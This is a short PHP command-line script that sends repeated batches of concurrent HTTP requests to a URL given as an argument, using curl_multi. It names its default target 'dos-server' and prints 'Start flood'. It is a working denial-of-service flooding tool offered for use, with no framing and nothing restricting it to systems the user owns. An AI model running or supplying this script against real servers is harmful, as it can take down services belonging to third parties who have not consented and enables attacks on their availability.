#! /usr/bin/env php

<?php

$url = (string)($argv[1] ?? 'http://dos-server');
$requestsBatchCount = (int)($argv[2] ?? 100);
$iterations = (int)($argv[3] ?? 10);

function sendAsyncRequests(string $url, int $requestsCount) {
    echo "Start flood for {$url} with {$requestsCount} async request" . PHP_EOL;

    $multi = curl_multi_init();
    $channels = array();

    foreach (range(1, $requestsCount) as $i) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        curl_multi_add_handle($multi, $ch);

        $channels[$i] = $ch;
    }

    $active = null;

    do {
        $mrc = curl_multi_exec($multi, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);

    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($multi) == -1) {
            continue;
        }

        do {
            $mrc = curl_multi_exec($multi, $active);
        } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }

    foreach ($channels as $channel) {
        echo curl_multi_getcontent($channel);
        curl_multi_remove_handle($multi, $channel);
    }

    curl_multi_close($multi);
}

$i = 0;

while ($i < $iterations) {
    sendAsyncRequests($url, $requestsBatchCount);
    $i++;
}

?>
